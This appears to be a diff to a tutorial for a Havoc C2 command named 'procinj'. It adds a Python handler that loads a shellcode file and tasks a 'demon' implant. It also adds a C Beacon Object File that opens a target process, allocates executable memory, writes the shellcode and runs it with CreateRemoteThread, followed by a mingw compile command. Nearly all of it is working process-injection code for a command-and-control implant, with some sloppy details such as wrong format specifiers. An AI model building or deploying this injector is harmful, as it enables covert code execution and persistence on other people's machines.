@@ -29,10 +29,33 @@ def run_procinj(demon_id, *args):
     # Get the beacon instance
     demon = Demon(demon_id)
 
-    # packs the userinput from C2 client
-    packer.addstr(args[0])
+    if len(args) < 2:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
+        return False
 
-    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process injection on the process ID: {args[0]}")
+    # Get shellcode path
+    path = args[0]
+
+    # Check if the shellcode path exists
+    if not exists(path):
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode not found: {path}")
+        return False
+
+    # Read the shellcode from the specified path into 'binary' variable
+    with open(path, 'rb') as handle:
+        binary = handle.read()
+
+    if not binary:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified shellcode is empty")
+        return False
+
+    # Add the arguments to the packer
+    packer.addbytes(binary)
+
+    # packs the userinput from C2 client
+    packer.addstr(args[1])
+
+    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process injection on the process ID: {args[1]}")
    
     demon.InlineExecute(task_id, "go", "bin/test2.o", packer.getbuffer(), False)
 
@@ -59,23 +82,79 @@ More information at [DFR](https://hstechdocs.helpsystems.com/manuals/cobaltstrik
 #include <windows.h>
 #include "beacon.h"
 
+//kernel32 dll
+DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+
+
 void go(char* args, int argc){
     
     datap parser;
     DWORD procid;
+    DWORD   dwOldProtection = NULL;
+    PSTR  shellcode = { 0 };
+    DWORD shellcodeLength    = { 0 };
+    SIZE_T  sNumberOfBytesWritten = NULL;
+    HANDLE pHandle;
+    HANDLE rthreadHandle;
+    PVOID bufferMemoryaddr;
 
     //Beacon data parser
     BeaconDataParse(&parser, args, argc);
+    
+
+    shellcode = BeaconDataExtract(&parser, &shellcodeLength);
     procid = BeaconDataExtract(&parser, NULL);
 
     //prints hello world
     BeaconPrintf(CALLBACK_OUTPUT, "[!] Target PID: %s", procid);
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] Shellcode length: %s", &shellcodeLength);
 
-    HANDLE pHandle;
-	HANDLE rthreadHandle;
-	PVOID buffer;
+    
+
+
+    pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);
+    if (!pHandle){
+        BeaconPrintf(CALLBACK_OUTPUT, "[x] Failed to open process error code: %d\n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    bufferMemoryaddr = KERNEL32$VirtualAllocEx(pHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if(!bufferMemoryaddr){
+        BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to allocate memory: %d\n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] Allocated Memory At : 0x%p \n", bufferMemoryaddr);
+
+    if (!KERNEL32$WriteProcessMemory(pHandle, bufferMemoryaddr, shellcode, shellcodeLength, &sNumberOfBytesWritten)) {
+        BeaconPrintf(CALLBACK_OUTPUT,"[x] WriteProcessMemory Failed With Error : %d \n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    if (!KERNEL32$VirtualProtectEx(pHandle, bufferMemoryaddr, shellcodeLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+        BeaconPrintf(CALLBACK_OUTPUT,"[x] KERNEL32$VirtualProtectEx Failed With Error : %d \n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    rthreadHandle = KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferMemoryaddr, NULL, 0, NULL);
+    if(!rthreadHandle){
+        BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to create remote thread: %d\n", KERNEL32$GetLastError());
+        return FALSE;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] remote thread memory At : 0x%p \n", rthreadHandle);
+
+    KERNEL32$CloseHandle(pHandle);
 
 }
+```
+
+```bash
+x86_64-w64-mingw32-gcc -c src/procinj.c -w -o bin/test2.o 
 ```
 
 
